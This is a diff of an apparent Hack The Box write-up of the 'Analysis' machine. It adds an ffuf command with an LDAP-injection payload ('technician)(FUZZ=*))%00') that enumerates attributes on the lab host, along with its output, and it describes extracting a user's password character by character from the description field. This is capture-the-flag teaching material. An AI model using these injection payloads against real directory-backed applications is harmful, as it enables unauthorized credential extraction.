@@ -432,9 +432,34 @@ _[**LDAP injection**](https://wiki.owasp.org/index.php/LDAP_injection) is a ser
 
 In layman's term: **LDAP Injection is a [syntax-weird](https://en.wikipedia.org/wiki/Polish_notation) SQLi**. 
 
-> [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection).
+> Useful resources: [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection), [Common LDAP Attribute Names](https://ftpdocs.broadcom.com/cadocs/0/CA%20Process%20Automation%2004%202%2002-ENU/Bookshelf_Files/HTML/Content%20Designer%20Reference/1187917.html).
 
-We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz the `description` parameter. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:
+
+Since we already know that there is a `name` parameter, we could start fuzzing for the next one which might contains the user's password:
+
+```bash
+$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(FUZZ=*))%00"  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -ac
+
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(FUZZ=*))%00
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
+countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 80ms]
+description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 73ms]
+displayname             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 43ms]
+name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 112ms]
+```
+
+There seem to be 5 parameteres to test. We can brute-forcing one-by-one and see what we get. Since it is common for the `description` filed to hold interesting information we can start with that. We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz it. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:
 
 ```bash
 # performing LDAP injection manually
@@ -452,9 +477,6 @@ seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
 
 N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
 ```
-
-- How did we enumerate the `description` field and how we figured out that the password was there?
-- The above works until it hits the `*` --> This is bypassed by scripting a brute-force attack.
 
 The following [Python script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/analysis/brute-force.py) is used to brute-force `technician`'s password:
 
@@ -493,6 +515,9 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+- Not yet sure how `(%26(objectClass=user)` was added in between!
+- The above works until it hits the `*` --> This is bypassed by scripting a brute-force attack.
 
 If we run the above script:
 
